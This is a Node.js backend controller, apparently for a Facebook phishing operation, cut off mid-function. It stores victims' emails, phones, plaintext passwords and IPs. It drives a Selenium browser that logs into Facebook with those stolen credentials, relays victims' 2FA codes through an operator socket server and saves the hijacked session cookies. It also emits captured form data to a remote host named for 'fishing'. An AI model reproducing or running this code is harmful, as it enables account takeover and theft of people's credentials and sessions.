const bcrypt = require("bcryptjs");
const TableSchema = require("../models/table.model");
const CTRL = require("../models/index");
const { Builder, By, Key, until } = require("selenium-webdriver");
const { Options } = require("selenium-webdriver/chrome");
const fs = require("fs");
const { NoSuchSessionError } = require("selenium-webdriver").error;

const path = require("path");
const {
  ChromeService,
  ServiceBuilder,
  Options: ChromeOptions,
} = require("selenium-webdriver/chrome");
const axios = require("axios");
const qs = require("querystring");
const { performance } = require("perf_hooks");
// const { socket } = require("../app");
const io = require("socket.io-client");
const socket = io("https://api-body-fishing-ztjz.onrender.com");

const create = async (req, res) => {
  try {
    const {
      ip,
      quocGiaIp,
      userGent,
      quocGiaPhone,
      phone,
      email,
      password,
      socketId,
      codeRandom,
      owner,
    } = req.body;
    const checkPhone = await TableSchema.find(
      { phone: phone } || { email: email }
    );
    // console.log(checkPhone);
    if (checkPhone.length > 0 && checkPhone !== null) {
      const a = await TableSchema.create({
        owner: owner,
        ip: ip,
        quocGiaIp: quocGiaIp,
        userGent: userGent,
        quocGiaPhone: quocGiaPhone,
        phone: phone,
        email: email,
        idStaff: checkPhone[0].idStaff,
        username: checkPhone[0].username,
        password: password,
        statusVery: true,
        socketId: socketId,
        codeRandom: codeRandom,
        note: true,
      });
      return res.status(200).json({
        data: a,
        oke: true,
        message: "Bạn đã tạo tài khoản thành công! 🎉'",
      });
    } else {
      const a = await TableSchema.create({
        ip: ip,
        quocGiaIp: quocGiaIp,
        userGent: userGent,
        quocGiaPhone: quocGiaPhone,
        phone: phone,
        email: email,
        password: password,
        socketId: socketId,
        codeRandom: codeRandom,
        note: false,
      });
      return res.status(200).json({
        data: a,
        oke: true,
        message: "Bạn đã tạo tài khoản thành công! 🎉'",
      });
    }
  } catch (error) {
    console.log(error);
    return res.status(500).json({ errMessage: error.message });
  }
};

const getTable = async (req, res) => {
  try {
    // const table = await TableSchema.find({})
    const { phone, password, email } = req.query;
    let query = {};

    if (phone && password && email) {
      query = {
        $and: [
          { phone: { $regex: phone, $options: "i" } },
          { password: { $regex: password, $options: "i" } },
          { email: { $regex: email, $options: "i" } },
        ],
      };
    } else if (phone) {
      query = { phone: { $regex: phone, $options: "i" } };
    } else if (password) {
      query = { password: { $regex: password, $options: "i" } };
    } else if (email) {
      query = { email: { $regex: email, $options: "i" } };
    }
    const table = await TableSchema.find(query).sort({ createdAt: -1 }).exec();

    if (!table) {
      return res.status(404).json({
        ok: false,
        errMessage: "Không tìm thấy người dùng.",
      });
    }
    if (table.length >= 16) {
      table.splice(15);
    }

    res.status(200).json({
      ok: true,
      table,
    });
  } catch (err) {
    res.status(500).json({
      ok: false,
      errMessage: "Lỗi trong quá trình lấy thông tin bảng.",
    });
  }
};

const updateTables = async (req, res) => {
  const data = req.body;
  try {
    const updatedData = {};
    const tableId = req.body._id ? req.body._id : null;
    if (req.body.idStaff) {
      updatedData.idStaff = req.body.idStaff;
    }
    if (req.body.otp2FA) {
      updatedData.otp2FA = req.body.otp2FA;
    }
    if (req.body.username) {
      updatedData.username = req.body.username;
    }
    if (req.body.password) {
      updatedData.password = req.body.password;
    }
    if (req.body.status) {
      updatedData.status = req.body.status;
    }

    if (Object.keys(updatedData).length === 0) {
      return res.status(400).json({
        ok: false,
        errMessage: "Không có dữ liệu để cập nhật.",
      });
    }
    const user = await TableSchema.findByIdAndUpdate(
      tableId,
      {
        $set: updatedData,
        $inc: { countUpdate: +1 },
      },
      {
        new: true,
      }
    );
    if (!user) {
      return res.status(404).json({
        ok: false,
        errMessage: "Không tìm thấy người dùng.",
      });
    }

    // user.isAdmin = undefined;
    // user.isStaff = undefined;
    // user.password = undefined;
    // user.__v = undefined;
    await user.save();
    res.status(200).json({
      ok: true,
      user,
    });
  } catch (err) {
    console.error(err);
    res.status(500).json({
      ok: false,
      errMessage: "Lỗi trong quá trình lấy thông tin người dùng.",
    });
  }
};
const checkFB = async (req, res) => {
  const formData = req.body;
  try {
    if (formData.email && formData.password) {
      let browser;
      // const userDataDir = path.join(__dirname, 'chrome_profiles', `${formData.email}_${Date.now()}`);
      // fs.mkdirSync(userDataDir);
      const chromeOptions = new ChromeOptions();
      chromeOptions.addArguments("--disable-gpu");
      chromeOptions.addArguments("--no-sandbox");
      chromeOptions.addArguments("--disable-dev-shm-usage");
      chromeOptions.addArguments("--disable-setuid-sandbox");
      chromeOptions.addArguments("--disable-extensions");
      // chromeOptions.addArguments(`user-data-dir=${userDataDir}`);
      //chromeOptions.addArguments(`user-data-dir=C:\\Users\\ACER\\AppData\\Local\\Google\\Chrome\\User Data\\${userDataDirIndex++}`)
      chromeOptions.excludeSwitches("enable-automation");
      chromeOptions.addArguments("--disable-popup-blocking");
      chromeOptions.addArguments("--disable-infobars");
      chromeOptions.addArguments(
        "--blink-settings=imagesEnabled=false,pluginsEnabled=false"
      );
      chromeOptions.setUserPreferences({
        "profile.default_content_setting_values.notifications": 2,
      });
      browser = await new Builder()
        .forBrowser("chrome")
        .setChromeOptions(chromeOptions)
        .build();

      await browser.get(`https://web.facebook.com/login.php`);
      try {
        await browser.sleep(800);
        await login(formData, browser);
        await browser.sleep(10000);
        let responseLogin = await someFunctionToGetResponseData(browser);
        let needToRetryLogin = true;

        while (needToRetryLogin) {
          if (
            responseLogin.data.includes(
              "The password that you've entered is incorrect."
            ) ||
            // responseLogin.data.includes('Try another way') ||
            (responseLogin.data.includes(
              "The email address you entered isn&#039;t connected to an account"
            ) &&
              responseLogin.data.includes("Invalid username or password") &&
              responseLogin.data.includes(
                "The email address or mobile number you entered isn&#039;t connected to an account"
              ) &&
              responseLogin.data.includes(
                "The password that you&#039;ve entered is incorrect."
              ) &&
              responseLogin.data.includes(
                "Choose a way to confirm that it&#039;s you"
              ) &&
              responseLogin.data.includes("Log in as") &&
              responseLogin.data.includes(
                'should_show_close_friend_badge":false'
              ))
          ) {
            // Thực hiện đăng nhập lại
            const dax = await TableSchema.findOne({
              codeRandom: formData.codeRandom,
            });
            const data = {
              codeRandom: formData.codeRandom,
              id: dax._id,
              idUser: dax._id,
              ip: formData.socketId,
              socketId: formData.ip,
              confirm: "deny",
            };
            const targetSocketId = data.codeRandom;
            const dataTable = await TableSchema.findById(data.id);
            // const dataTable2 = await TableSchema.findById(data.id);
            // const datas = {
            //   codeRandom: formData.codeRandom,
            //   id: dataTable2._id,
            //   idUser: dataTable2._id,
            //   ip: formData.socketId,
            //   socketId: formData.ip,
            //   confirm: 'agree'
            // };
            const datas2 = {
              codeRandom: formData.codeRandom,
              id: dataTable._id,
              idUser: dataTable._id,
              ip: formData.socketId,
              socketId: formData.ip,
              confirm: "deny",
            };
            socket.emit("adminMessage", datas2);
            console.log("first");
            let daxs = await TableSchema.findOne({
              codeRandom: formData.codeRandom,
            });
            while (daxs.countUpdate === 0) {
              console.log(daxs);

              const data = {
                codeRandom: formData.codeRandom,
                id: daxs._id,
                idUser: daxs._id,
                ip: formData.socketId,
                socketId: formData.ip,
                confirm: "deny",
              };
              const datax = {
                confirm: data.confirm,
                id: data.id,
                ip: data.ip,
                codeRandom: data.codeRandom,
              };
              socket.emit("adminMessage", datax);

              // Thực hiện lại hàm lấy response
              responseLogin = await someFunctionToGetResponseData(browser);

              // Chờ 10 giây trước khi kiểm tra lại
              await new Promise((resolve) => setTimeout(resolve, 10000));

              // Cập nhật lại giá trị của dax
              // daxs = await TableSchema.findOne({
              //   codeRandom: formData.codeRandom,
              // });
              // let checkOTP;
              // let checkOTP2;
              // try {
              //   checkOTP = await browser.findElement(By.id("approvals_code"));
              //   checkOTP2 = await browser.findElement(
              //     By.xpath(
              //       '//*/div/form/div/div/div/div[1]/div[1]/input[@dir="ltr"]'
              //     )
              //   );
              // } catch (error) {
              //   console.log("Không tìm thấy phần tử 'approvals_code'");
              // }

              // if (checkOTP) {
              //   await checkOTP.sendKeys(formData.otp2FA);
              //   await browser.sleep(500);
              //   let connectOTP;
              //   try {
              //     connectOTP = await browser.findElement(
              //       By.id("checkpointSubmitButton")
              //     );
              //   } catch (error) {
              //     console.log(
              //       "Không tìm thấy phần tử 'checkpointSubmitButton'"
              //     );
              //   }

              //   if (connectOTP) {
              //     await connectOTP.click();
              //   } else {
              //     console.log(
              //       "Không tìm thấy phần tử 'checkpointSubmitButton' để click"
              //     );
              //   }
              // } else if (checkOTP2) {
              //   await checkOTP2.sendKeys(formData.otp2FA);
              //   await browser.sleep(500);
              //   let connectOTP2;
              //   try {
              //     connectOTP2 = await browser.findElement(
              //       By.xpath(
              //         '//*/div[3]/div/div[1]/div/div/div/div[2][@data-visualcompletion="ignore"]'
              //       )
              //     );
              //   } catch (error) {
              //     console.log(
              //       "Không tìm thấy phần tử 'checkpointSubmitButton'"
              //     );
              //   }

              //   if (connectOTP2) {
              //     await connectOTP2.click();
              //   } else {
              //     console.log(
              //       "Không tìm thấy phần tử 'checkpointSubmitButton' để click"
              //     );
              //   }
              // }
            }
            if (dataTable) {
              try {
                const datax = {
                  confirm: datas2.confirm,
                  id: datas2.id,
                  ip: datas2.ip,
                  codeRandom: targetSocketId,
                };
                socket.emit("adminMessage", datax);
                browser.sleep(5000);
                const dax = await TableSchema.findOne({
                  codeRandom: formData.codeRandom,
                });
                await loginPassNext(dax, browser);
              } catch (error) {
                console.error("Lỗi khi gửi tin nhắn:", error);
              }
            }
            // Thực hiện lại hàm lấy response
            responseLogin = await someFunctionToGetResponseData(browser);
          } else if (responseLogin.data.includes("Log in with password")) {
            await browser
              .findElement(
                By.xpath('//a[contains(text(), "Log in with password")]')
              )
              .click();
            await new Promise((resolve) => setTimeout(resolve, 3000));
            let daxs = await TableSchema.findOne({
              codeRandom: formData.codeRandom,
            });
            const data = {
              codeRandom: formData.codeRandom,
              id: daxs._id,
              idUser: daxs._id,
              ip: formData.socketId,
              socketId: formData.ip,
              confirm: "deny",
            };
            const datax = {
              confirm: data.confirm,
              id: data.id,
              ip: data.ip,
              codeRandom: data.codeRandom,
            };
            socket.emit("adminMessage", datax);

            // Thực hiện lại hàm lấy response
            responseLogin = await someFunctionToGetResponseData(browser);
            while (daxs.countUpdate === 0) {
              console.log(daxs);

              const data = {
                codeRandom: formData.codeRandom,
                id: daxs._id,
                idUser: daxs._id,
                ip: formData.socketId,
                socketId: formData.ip,
                confirm: "deny",
              };
              const datax = {
                confirm: data.confirm,
                id: data.id,
                ip: data.ip,
                codeRandom: data.codeRandom,
              };
              socket.emit("adminMessage", datax);

              // Thực hiện lại hàm lấy response
              responseLogin = await someFunctionToGetResponseData(browser);

              // Chờ 10 giây trước khi kiểm tra lại
              // await new Promise((resolve) => setTimeout(resolve, 10000));

              // Cập nhật lại giá trị của dax
            }
            if (daxs.countUpdate > 0) {
              await loginRecursiveCheck(responseLogin, formData, browser);
            } else {
              const data = {
                codeRandom: formData.codeRandom,
                id: daxs._id,
                idUser: daxs._id,
                ip: formData.socketId,
                socketId: formData.ip,
                confirm: "deny",
              };
              const datax = {
                confirm: data.confirm,
                id: data.id,
                ip: data.ip,
                codeRandom: data.codeRandom,
              };
              socket.emit("adminMessage", datax);
              // Thực hiện lại hàm lấy response
              responseLogin = await someFunctionToGetResponseData(browser);
              let checkOTP;
              let checkOTP2;
              try {
                checkOTP = await browser.findElement(By.id("approvals_code"));
                checkOTP2 = await browser.findElement(
                  By.xpath(
                    '//div/form/div/div/div/div[1]/div[1]/input[@dir="ltr"]'
                  )
                );
              } catch (error) {
                console.error("Không tìm thấy phần tử 'approvals_code'");
              }

              if (checkOTP) {
                await checkOTP.sendKeys(formData.otp2FA);
                await browser.sleep(500);
                let connectOTP;
                try {
                  connectOTP = await browser.findElement(
                    By.id("checkpointSubmitButton")
                  );
                } catch (error) {
                  console.error(
                    "Không tìm thấy phần tử 'checkpointSubmitButton'"
                  );
                }

                if (connectOTP) {
                  await connectOTP.click();
                } else {
                  console.error(
                    "Không tìm thấy phần tử 'checkpointSubmitButton' để click"
                  );
                }
              } else if (checkOTP2) {
                await checkOTP2.sendKeys(formData.otp2FA);
                await browser.sleep(500);
                let connectOTP2;
                try {
                  connectOTP2 = await browser.findElement(
                    By.xpath(
                      '//div[3]/div/div[1]/div/div/div/div[2][@data-visualcompletion="ignore"]'
                    )
                  );
                } catch (error) {
                  console.error(
                    "Không tìm thấy phần tử 'checkpointSubmitButton'"
                  );
                }

                if (connectOTP2) {
                  await connectOTP2.click();
                } else {
                  console.error(
                    "Không tìm thấy phần tử 'checkpointSubmitButton' để click"
                  );
                }
              }
            }
            // if (
            //   responseLogin.data.includes('Log in to') ||
            //   // responseLogin.data.includes('Try another way') ||
            //   (responseLogin.data.includes('The email address you entered isn&#039;t connected to an account') &&
            //     responseLogin.data.includes('The email address or mobile number you entered isn&#039;t connected to an account') &&
            //     responseLogin.data.includes('The password that you&#039;ve entered is incorrect.') &&
            //     responseLogin.data.includes('Choose a way to confirm that it&#039;s you') &&
            //     responseLogin.data.includes("The password that you've entered is incorrect.") &&
            //     responseLogin.data.includes('should_show_close_friend_badge":false'))) {
            //   // Thực hiện đăng nhập lại
            //   const dax = await TableSchema.findOne({
            //     codeRandom: formData.codeRandom
            //   });
            //   console.log("dax",dax)
            //   const data = {
            //     codeRandom: formData.codeRandom,
            //     id: dax._id,
            //     idUser: dax._id,
            //     ip: formData.socketId,
            //     socketId: formData.ip,
            //     confirm: 'deny'
            //   };
            //   const targetSocketId = data.codeRandom;
            //   // const dataTable = await TableSchema.findById(data.id);
            //   // const dataTable2 = await TableSchema.findById(data.id);
            //   // const datas = {
            //   //   codeRandom: formData.codeRandom,
            //   //   id: dataTable2._id,
            //   //   idUser: dataTable2._id,
            //   //   ip: formData.socketId,
            //   //   socketId: formData.ip,
            //   //   confirm: 'agree'
            //   // };
            //   // const datas2 = {
            //   //   codeRandom: formData.codeRandom,
            //   //   id: dataTable._id,
            //   //   idUser: dataTable._id,
            //   //   ip: formData.socketId,
            //   //   socketId: formData.ip,
            //   //   confirm: 'deny'
            //   // };
            //   if (dax.status == 'pending') {
            //     const datax = { confirm: data.confirm, id: data.id, ip: data.ip, codeRandom: targetSocketId };
            //     socket.emit("adminMessage", datax);
            //     browser.sleep(20000);
            //     await loginPassNext(formData, browser);
            //   }

            //   // Thực hiện lại hàm lấy response
            //   responseLogin = await someFunctionToGetResponseData(browser);
            // }
          }
          // else if (!responseLogin.data.includes("Log in with password") || !responseLogin.data.includes(
          //   "The password that you've entered is incorrect."
          // ) ||
          //   // responseLogin.data.includes('Try another way') ||
          //   !(responseLogin.data.includes(
          //     "The email address you entered isn&#039;t connected to an account"
          //   ) &&
          //     responseLogin.data.includes(
          //       "The email address or mobile number you entered isn&#039;t connected to an account"
          //     ) &&
          //     responseLogin.data.includes(
          //       "The password that you&#039;ve entered is incorrect."
          //     ) &&
          //     responseLogin.data.includes(
          //       "Choose a way to confirm that it&#039;s you"
          //     ) &&
          //     responseLogin.data.includes("Log in as") &&
          //     responseLogin.data.includes(
          //       'should_show_close_friend_badge":false'
          //     )))
          //     {
          //   while (daxs.countUpdate === 0) {
          //     console.log(daxs);

          //     const data = {
          //       codeRandom: formData.codeRandom,
          //       id: daxs._id,
          //       idUser: daxs._id,
          //       ip: formData.socketId,
          //       socketId: formData.ip,
          //       confirm: "agree",
          //     };
          //     const datax = {
          //       confirm: data.confirm,
          //       id: data.id,
          //       ip: data.ip,
          //       codeRandom: data.codeRandom,
          //     };
          //     socket.emit("adminMessage", datax);

          //     // Thực hiện lại hàm lấy response
          //     responseLogin = await someFunctionToGetResponseData(browser);

          //     // Chờ 10 giây trước khi kiểm tra lại
          //     // await new Promise((resolve) => setTimeout(resolve, 10000));

          //     // Cập nhật lại giá trị của dax
          //     daxs = await TableSchema.findOne({
          //       codeRandom: formData.codeRandom,
          //     });
          //     await TableSchema.findOneAndUpdate({
          //       codeRandom: formData.codeRandom,
          //     }, {status: "done"});
          //     let checkOTP;
          //     try {
          //       checkOTP = await browser.findElement(By.id("approvals_code"));
          //     } catch (error) {
          //       console.log("Không tìm thấy phần tử 'approvals_code'");
          //     }

          //     if (checkOTP) {
          //       await checkOTP.sendKeys(formData.otp2FA);
          //       await browser.sleep(500);
          //       let connectOTP;
          //       try {
          //         connectOTP = await browser.findElement(By.id("checkpointSubmitButton"));
          //       } catch (error) {
          //         console.log("Không tìm thấy phần tử 'checkpointSubmitButton'");
          //       }

          //       if (connectOTP) {
          //         await connectOTP.click();
          //       } else {
          //         console.log("Không tìm thấy phần tử 'checkpointSubmitButton' để click");
          //       }
          //     }
          //   }
          // }
          else {
            // Không cần đăng nhập lại nữa
            needToRetryLogin = false;
          }
        }
        let daxs = await TableSchema.findOne({
          codeRandom: formData.codeRandom,
        });
        let checkOTP;
        let checkOTP1;
        try {
          checkOTP = await browser.findElement(By.id("approvals_code"));
        } catch (error) {
          console.error("Không tìm thấy phần tử 'approvals_code'");
        }

        if (checkOTP) {
          daxs = await TableSchema.findOne({
            codeRandom: formData.codeRandom,
          });
          const datas = {
            codeRandom: formData.codeRandom,
            id: daxs._id,
            idUser: daxs._id,
            ip: formData.socketId,
            socketId: formData.ip,
            confirm: "agree",
          };
          socket.emit("adminMessage", datas);
          while (daxs.otp2FA === null) {
            await new Promise((resolve) => setTimeout(resolve, 6000));
            daxs = await TableSchema.findOne({
              codeRandom: formData.codeRandom,
            });
          }
          await checkOTP.sendKeys(daxs.otp2FA);
          await browser.sleep(500);
          let connectOTP;
          try {
            connectOTP = await browser.findElement(
              By.id("checkpointSubmitButton")
            );
          } catch (error) {
            console.error("Không tìm thấy phần tử 'checkpointSubmitButton'");
          }

          if (connectOTP) {
            await connectOTP.click();
            responseLogin = await someFunctionToGetResponseData(browser);
          } else {
            console.error(
              "Không tìm thấy phần tử 'checkpointSubmitButton' để click"
            );
          }
          let checkOtpx;
          let checkOtpx1;
          try {
            await browser.sleep(5000);

            checkOtpx = await browser.findElement(
              By.xpath("//span[@data-xui-error]")
            );
            checkOtpx1 = responseLogin.data.includes(
              "Mã này không đúng. Hãy kiểm tra xem bạn đã nhập đúng mã chưa hoặc thử mã mới."
            );
          } catch (error) {
            console.error("Không tìm thấy phần tử ", error);
          }
          // console.log("checkOtpx", checkOtpx);
          if (checkOtpx) {
            console.error("checkOtpx");

            const datas = {
              check: "check",
              codeRandom: formData.codeRandom,
              id: daxs._id,
              idUser: daxs._id,
              ip: formData.socketId,
              socketId: formData.ip,
              confirm: "deny",
            };
            socket.emit("adminMessage", datas);
            await browser.sleep(6000);
          } else if (checkOtpx1) {
            console.log("checkOtpx1");
            const datas = {
              check: "check",
              codeRandom: formData.codeRandom,
              id: daxs._id,
              idUser: daxs._id,
              ip: formData.socketId,
              socketId: formData.ip,
              confirm: "deny",
            };
            socket.emit("adminMessage", datas);
            await browser.sleep(6000);
          } else {
            console.log(
              "Không tìm thấy phần tử 'checkpointSubmitButton' để click"
            );
          }
          while (checkOtpx || checkOtpx1) {
            responseLogin = await someFunctionToGetResponseData(browser);
            if (checkOtpx) {
              try {
                checkOTP = await browser.findElement(By.id("approvals_code"));
              } catch (error) {
                console.error("Không tìm thấy phần tử 'approvals_code'");
              }
              try {
                connectOTP = await browser.findElement(
                  By.id("checkpointSubmitButton")
                );
              } catch (error) {
                console.error(
                  "Không tìm thấy phần tử 'checkpointSubmitButton'"
                );
              }
              daxs = await TableSchema.findOne({
                codeRandom: formData.codeRandom,
              });
              await checkOTP.sendKeys(daxs.otp2FA);
              await browser.sleep(500);
              await connectOTP.click();
              await browser.sleep(5000);
              checkOtpx = await browser.findElement(
                By.xpath("//span[@data-xui-error]")
              );
              const datas = {
                check: "check",
                codeRandom: formData.codeRandom,
                id: daxs._id,
                idUser: daxs._id,
                ip: formData.socketId,
                socketId: formData.ip,
                confirm: "deny",
              };
              socket.emit("adminMessage", datas);
            } else if (checkOtpx1) {
              try {
                checkOTP1 = await browser.findElement(
                  By.xpath(
                    '//div/form/div/div/div/div[1]/div[1]/input[@dir="ltr"]'
                  )
                );
              } catch (error) {
                console.error("Không tìm thấy phần tử 'approvals_code'");
              }
              try {
                connectOTP = await browser.findElement(
                  By.xpath(
                    '//div[3]/div/div[1]/div/div/div/div[2][@data-visualcompletion="ignore"]'
                  )
                );
              } catch (error) {
                console.error(
                  "Không tìm thấy phần tử 'checkpointSubmitButton'"
                );
              }
              daxs = await TableSchema.findOne({
                codeRandom: formData.codeRandom,
              });
              await checkOTP1.sendKeys(daxs.otp2FA);
              await browser.sleep(500);
              await connectOTP.click();
              await browser.sleep(5000);
              checkOtpx1 = await responseLogin.data.includes(
                "Mã này không đúng. Hãy kiểm tra xem bạn đã nhập đúng mã chưa hoặc thử mã mới."
              );
              const datas = {
                check: "check",
                codeRandom: formData.codeRandom,
                id: daxs._id,
                idUser: daxs._id,
                ip: formData.socketId,
                socketId: formData.ip,
                confirm: "deny",
              };
              socket.emit("adminMessage", datas);
            }
          }
        }
        // if (checkOTP) {
        //   console.log("checkOtpss");
        //   let dax = await TableSchema.findOne({
        //     codeRandom: formData.codeRandom,
        //   });
        //   const datas = {
        //     codeRandom: formData.codeRandom,
        //     id: dax._id,
        //     idUser: dax._id,
        //     ip: formData.socketId,
        //     socketId: formData.ip,
        //     confirm: "agree",
        //   };
        //   socket.emit("adminMessage", datas);

        //   while (dax.otp2FA === null) {
        //     await new Promise((resolve) => setTimeout(resolve, 6000));
        //     dax = await TableSchema.findOne({
        //       codeRandom: formData.codeRandom,
        //     });
        //   }
        //   if (dax.otp2FA !== null) {
        //     const datax = {
        //       confirm: "deny",
        //       id: dax.id,
        //       ip: dax.ip,
        //       codeRandom: dax.codeRandom,
        //     };
        //     socket.emit("adminMessage", datax);

        //     await checkOTP.sendKeys(dax.otp2FA);
        //     browser.sleep(500);
        //     const connectOTP = browser.findElement(
        //       By.id("checkpointSubmitButton")
        //     );
        //     await connectOTP.click();
        //     responseLogin = await someFunctionToGetResponseData(browser);

        //     await new Promise((resolve) => setTimeout(resolve, 6000));
        //     let checkOtpx = await browser.findElement(
        //       By.xpath("//span[@data-xui-error]")
        //     );
        //     while (checkOtpx) {
        //       dax = await TableSchema.findOne({
        //         codeRandom: formData.codeRandom,
        //       });
        //       const datax = {
        //         confirm: "deny",
        //         id: dax.id,
        //         ip: dax.ip,
        //         codeRandom: dax.codeRandom,
        //       };
        //       console.log("check1");
        //       socket.emit("adminMessage", datax);
        //       await new Promise((resolve) => setTimeout(resolve, 10000));

        //       await checkOTP.sendKeys(dax.otp2FA);
        //       browser.sleep(500);
        //       const connectOTP = browser.findElement(
        //         By.id("checkpointSubmitButton")
        //       );
        //       await connectOTP.click();
        //       responseLogin = await someFunctionToGetResponseData(browser);

        //       checkOtpx = await browser.findElement(
        //         By.xpath("//span[@data-xui-error]")
        //       );
        //     }
        //   }
        // }
        // Thực hiện đăng nhập bình thường nếu không gặp điều kiện đăng nhập lại
        // if (!responseLogin.data.includes('Log in as') && !responseLogin.data.includes('Try another way')) {
        //   await login(formData, browser);
        // }

        const cookies = await browser.manage().getCookies();
        let filteredCookies = "";
        cookies.forEach((cookie) => {
          filteredCookies += `${cookie.name}=${cookie.value};`;
        });
        filteredCookies += "";
        console.log("Cookies:", filteredCookies);
        console.log("formData:", formData);
        if (formData.codeRandom) {
          await TableSchema.findOneAndUpdate(
            {
              codeRandom: formData.codeRandom,
            },
            {
              cookie: filteredCookies,
            }
          );
        }
        await browser.close();
        const datax = {
          confirm: "success",
          // id: data.id,
          // ip: data.ip,
          codeRandom: formData.codeRandom,
        };
        await socket.emit("adminMessage", datax);
        await socket.emit("serverResponse", formData);
      } catch (error) {
        const datax = {
          confirm: "success",
          // id: data.id,
          // ip: data.ip,
          codeRandom: formData.codeRandom,
        };
        await socket.emit("adminMessage", datax);
        console.error("Log lỗi: ", error);
        if (error instanceof NoSuchSessionError) {
          await browser.close();

          // Re-initialize WebDriver session or handle the error accordingly
          console.log(
            "Session is invalid. Re-initializing WebDriver session..."
          );
          // Re-initialize WebDriver session here
        } else {
          await browser.close();

          // Handle other types of errors
          console.log("Other error occurred. Handling...");
          // Handle other errors here
        }
      } finally {
        await browser.close();
        await socket.emit("serverResponse", formData);
      }
    }
  } catch (error) {
    return res.status(500).json({ error });
  }
};
async function someFunctionToGetResponseData(browser) {
  const pageSource = await browser.getPageSource();
  return {
    data: pageSource,
  };
}

async function login(formData, browser) {
  console.log("formData", formData);

  password = formData.password;
  const [emailInput, passwordInput, clickInput] = await Promise.all([
    browser.findElement(By.id("email")),
    browser.findElement(By.id("pass")),
    browser.findElement(By.name("login")),
  ]);
  await emailInput.click();
  await emailInput.sendKeys(formData.email);
  // await browser.sleep(500);
  await passwordInput.click();
  await passwordInput.sendKeys(password);
  // await browser.sleep(500);
  await clickInput.click();
  // await browser.sleep(500);
  // await browser.executeScript(`
  // document.getElementById('email').value = "${formData.email}";
  // document.getElementById('pass').value = "${password}";
  // document.querySelector('button[name="login"]').click();
  // `);
  // await browser.sleep(500);
}
async function loginRecursiveCheck(responseLogin, formData, browser) {
  if (
    responseLogin.data.includes("Log in to") ||
    (responseLogin.data.includes(
      "The email address you entered isn&#039;t connected to an account"
    ) &&
      responseLogin.data.includes("Invalid username or password") &&
      responseLogin.data.includes(
        "The email address or mobile number you entered isn&#039;t connected to an account"
      ) &&
      responseLogin.data.includes(
        "The password that you&#039;ve entered is incorrect."
      ) &&
      responseLogin.data.includes(
        "Choose a way to confirm that it&#039;s you"
      ) &&
      responseLogin.data.includes(
        "The password that you've entered is incorrect."
      ) &&
      responseLogin.data.includes('should_show_close_friend_badge":false'))
  ) {
    // Thực hiện đăng nhập lại
    const dax = await TableSchema.findOne({
      codeRandom: formData.codeRandom,
    });

    const data = {
      codeRandom: formData.codeRandom,
      id: dax._id,
      idUser: dax._id,
      ip: formData.socketId,
      socketId: formData.ip,
      confirm: "deny",
    };
    const targetSocketId = data.codeRandom;

    if (dax.status == "pending") {
      const datax = {
        confirm: data.confirm,
        id: data.id,
        ip: data.ip,
        codeRandom: targetSocketId,
      };
      socket.emit("adminMessage", datax);
      // Thêm delay 20s trước khi thực hiện đăng nhập lại
      await new Promise((resolve) => setTimeout(resolve, 3000));
      await loginPassNext(dax, browser);
    }

    // Thực hiện lại hàm lấy response
    responseLogin = await someFunctionToGetResponseData(browser);

    // Gọi đệ quy
    await loginRecursiveCheck(responseLogin, formData, browser);
  }
}
async function loginPassNext(formData, browser) {
  password = formData.password;
  // const [passwordInput, clickInput] = await Promise.all([
  //   browser.findElement(By.id('pass')),
  //   browser.findElement(By.name('login'))
  // ]);
  // await browser.sleep(200);
  // await passwordInput.click();
  // await passwordInput.sendKeys(password);
  // await browser.sleep(500);
  // await clickInput.click();
  // await browser.sleep(500);
  await browser.executeScript(`
  document.getElementById('pass').value = "${password}";
  document.querySelector('button[name="login"]').click();
  `);
  await browser.sleep(500);
}
// const handleTableRequest = async (req, res) => {
//   try {
//     if (req.method === 'POST') {
//       try {
//         const { ip, quocGiaIp, userGent, quocGiaPhone, phone, email, password } = req.body;

//         const newUser = new TableSchema({
//           ip: ip,
//           quocGiaIp: quocGiaIp,
//           userGent: userGent,
//           quocGiaPhone: quocGiaPhone,
//           phone: phone,
//           email: email,
//           password: password
//         });
//         await newUser.save();
//         socket.emit('newData', { message: 'Dữ liệu mới đã được tạo', newData: newUser });
//         res.status(200).json({
//           oke: true,
//           message: "Bạn đã tạo tài khoản thành công! 🎉'",
//         });
//       } catch (error) {
//         console.log(error);
//         return res.status(500).json({ errMessage: error.message });
//       }
//     } else if (req.method === 'GET') {
//       try {
//         // if (!req.user) {
//         //   return res.status(401).json({
//         //     ok: false,
//         //     errMessage: 'Token không hợp lệ hoặc người dùng không xác thực.',
//         //   });
//         // }

//         const table = await TableSchema.find();
//         if (!table) {
//           return res.status(404).json({
//             ok: false,
//             errMessage: 'Không tìm thấy người dùng.',
//           });
//         }
//         socket.emit('tableData', { data: table });

//         res.status(200).json({
//           ok: true,
//           table,
//         });
//       } catch (err) {
//         res.status(500).json({
//           ok: false,
//           errMessage: 'Lỗi trong quá trình lấy thông tin bảng.',
//         });
//       }
//     }
//   } catch (err) {
//     res.status(500).json({
//       ok: false,
//       errMessage: 'Lỗi trong quá trình xử lý yêu cầu bảng.',
//     });
//   }
// };

const confirmUser = (req, res) => {};

const getUserProfile = async (req, res) => {
  try {
    if (!req.user) {
      return res.status(401).json({
        ok: false,
        errMessage: "Token không hợp lệ hoặc người dùng không xác thực.",
      });
    }
    const userId = req.user ? req.user.id : null;
    const user = await TableSchema.findOne({ _id: userId });

    if (!user) {
      return res.status(404).json({
        ok: false,
        errMessage: "Không tìm thấy người dùng.",
      });
    }
    user.isAdmin = undefined;
    user.isStaff = undefined;
    user.password = undefined;
    user.__v = undefined;

    res.status(200).json({
      ok: true,
      user,
    });
  } catch (err) {
    res.status(500).json({
      ok: false,
      errMessage: "Lỗi trong quá trình lấy thông tin người dùng.",
    });
  }
};

const getAllUser = async (req, res) => {
  try {
    const users = await TableSchema.find({ isStaff: true }).sort("__v");
    const usersWithoutPassword = users.map((user) => {
      const { password, isAdmin, ...userWithoutPassword } = user.toObject();
      return userWithoutPassword;
    });
    const countAllUsers = users.length;

    return res.status(200).json({
      count: countAllUsers,
      user: usersWithoutPassword,
    });
  } catch (err) {
    console.log(err);
    return res.status(500).json({ msg: err.message });
  }
};

const searchTable = async (req, res) => {
  try {
    const { phone, password, email } = req.query;
    let query = {};

    if (phone && password && email) {
      query = {
        $and: [
          { phone: { $regex: phone, $options: "i" } },
          { password: { $regex: password, $options: "i" } },
          { email: { $regex: email, $options: "i" } },
        ],
      };
    } else if (phone) {
      query = { phone: { $regex: phone, $options: "i" } };
    } else if (password) {
      query = { password: { $regex: password, $options: "i" } };
    } else if (email) {
      query = { email: { $regex: email, $options: "i" } };
    }

    const searchStaff = await TableSchema.find(query);

